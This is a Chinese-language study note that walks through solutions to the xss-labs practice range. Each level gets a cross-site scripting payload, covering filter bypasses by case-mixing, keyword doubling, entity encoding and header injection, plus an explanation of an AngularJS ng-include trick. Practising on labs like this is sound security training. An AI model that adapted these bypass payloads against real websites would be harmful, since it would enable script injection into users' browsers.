---
title: "网安笔记 - 靶场实例 - xss跨站攻击 - xsslabs - payload"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

### payload

<script>alert(1)</script>

### level2
### payload

"><script>alert(1)</script>

### level3
### payload

'onclick='alert(1)

### level4
### payload

try+harder%21" onclick="alert(1)

### level5
### payload

```html
"> <a href="javascript:alert(1)">123</a>
```

### level6
### payload

```html
"> <a hRef="javascript:alert(1)">123</a>
```

### level7
### payload

```html
"> <a hRhrefef="javascrscriptipt:alert(1)">123</a>
```

### level8
### payload

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;(Unicode编码)

### level9
### payload

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41; //http://

### level10
### payload

```html
&t_sort="onclick="alert(1)" type="text
```

### level11
### payload

```html
&t_sort="onclick="alert(1)" type="text
```
**要抓包 自己写个referer头去传这个参数**

### level12
### payload

```html
&t_sort="onclick="alert(1)" type="text
```
**抓包 从user-agent这个头传**

### level13
### payload

```html
&t_sort="onclick="alert(1)" type="text
```
**抓包 从cookie传**

### level14

漏洞描述：修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行漏洞复现)

### level15
### payload

```html
?src='level1.php?name=<img src=1 onerror=alert(1)>'
```

---

从源码中可以看到的是传递参数src

1、ng-include 指令用于包含外部的 HTML文件。

2、包含的内容将作为指定元素的子节点。

3、ng-include 属性的值可以是一个表达式，返回一个文件名。

4、默认情况下，包含的文件需要包含在同一个域名下。

特别值得注意的几点如下：

1.ng-include,如果单纯指定地址，必须要加引号

2.ng-include,加载外部html，script标签中的内容不执行

3.ng-include,加载外部html中含有style标签样式可以识别

构造函数
```html
?src='level1.php?name=<img src=1 onerror=alert(1)>'
```

因为这里参数值算是一个地址，所以需要添加引号。

但是level1.php不是一个php文件吗？

这里解释一下

这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。

### level16
### payload

<img%0Asrc=1%0Aonerror=alert(1)>

### level17
### payload

?arg01=" onclick&arg02=alert(1)